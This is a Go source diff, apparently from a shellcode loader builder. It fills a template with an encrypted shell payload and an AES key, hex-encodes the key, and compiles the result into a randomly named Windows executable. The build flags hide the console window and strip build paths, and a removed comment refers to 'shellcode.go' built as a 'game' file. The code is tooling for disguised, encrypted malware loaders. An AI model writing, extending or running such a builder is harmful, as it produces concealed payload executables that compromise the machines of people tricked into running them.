@@ -3,6 +3,7 @@ package In
 import (
 	"bytes"
 	"crypto/rand"
+	"encoding/hex"
 	"fmt"
 	"io/ioutil"
 	"math/big"
@@ -18,11 +19,14 @@ func Tpl_go(enshell ,key string, keymode int,s string) string {
 	sname := tplname(s)
 	tpl(enshell,key, sname,keymode)
 
+
+
 	randomStr := CreateRandomString(6)
 	Filename := randomStr + ".exe"
 	time.Sleep(2)
-	//cmd = *exec.Command("cmd.exe", "/c", "go", "build", "-ldflags", "-H windowsgui -s -w", "shellcode.go", "-o game"+outFile)
-	cmd := exec.Command("cmd", "/c", "go build -ldflags=-H=windowsgui -o "+Filename+" "+sname+".go")
+
+	//a:="go build -ldflags=\"-w -s -H=windowsgui\" -o "+"./bin/"+Filename+" \"+sname+\".go\""
+	cmd:=exec.Command("cmd", "/c", "go build -ldflags=-H=windowsgui --trimpath -o "+"./bin/"+Filename+" "+sname+".go")
 	err := cmd.Run()
 	if err != nil {
 		panic(err)
@@ -33,12 +37,13 @@ func Tpl_go(enshell ,key string, keymode int,s string) string {
 
 func tpl(tshell, key,tplname string,Kmode int) {
 	smode :=fmt.Sprintf("%d", Kmode)
+	skey :=hex.EncodeToString([]byte(key))
 	type Inventory struct {
 		Exshell string
 		AesKey	string
 		Keymode string
 	}
-	Texts := Inventory{tshell,key,smode}
+	Texts := Inventory{tshell,skey,smode}
 	gname := movfile(tplname)
 	tmpl, err := template.ParseFiles(tplname)
 	file, err := os.OpenFile(gname, os.O_CREATE|os.O_WRONLY, 0755)
@@ -71,6 +76,7 @@ func CreateRandomString(len int) string {
 func tplname(src string) string {
 	var name string
 	name = "./In/template/"+src
+
 	return name
 
 }
